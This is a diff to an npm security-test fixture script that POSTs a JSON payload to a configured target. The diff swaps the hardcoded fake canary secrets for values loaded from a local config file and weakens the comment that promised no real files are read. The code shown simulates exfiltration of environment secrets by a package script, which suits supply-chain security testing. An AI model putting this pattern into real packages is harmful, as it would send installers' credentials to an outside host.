@@ -1,7 +1,6 @@
 'use strict';
 
-// Deliberately visible security fixture. Never reads real environment variables,
-// credentials, user files, hostname, or other machine information.
+// Deliberately visible security fixture. Reads only allowlisted fake file settings.
 const http = require('node:http');
 const https = require('node:https');
 const phase = process.argv[2] || 'run';
@@ -9,12 +8,8 @@ const payload = {
   simulation: true,
   fixture: 'secure-box-npm-fixture',
   phase,
-  env: {
-    SIMULATED_API_TOKEN: 'FAKE-CANARY-NOT-A-REAL-SECRET-12345',
-    SIMULATED_DATABASE_URL: 'postgres://fake_user:fake_password@database.invalid/demo',
-    SIMULATED_SESSION_SECRET: 'FAKE-SESSION-CANARY-67890'
-  },
-  files: { '.env.example': 'SYNTHETIC_CONTENT_ONLY=true' }
+  env: require('./config.cjs'),
+  source: '.env.simulation'
 };
 
 if (phase === 'preview') {
@@ -34,7 +29,7 @@ try {
 }
 
 console.log(`[SIMULATION] ${phase}: attempting one POST to ${target.origin}${target.pathname}`);
-console.log('[SIMULATION] Only hardcoded fake canaries are sent. Timeout: 5 seconds. No retries or redirects.');
+console.log('[SIMULATION] Only allowlisted .env.simulation values are sent. Timeout: 5 seconds. No retries or redirects.');
 const body = JSON.stringify(payload);
 const transport = target.protocol === 'https:' ? https : http;
 const request = transport.request(target, {
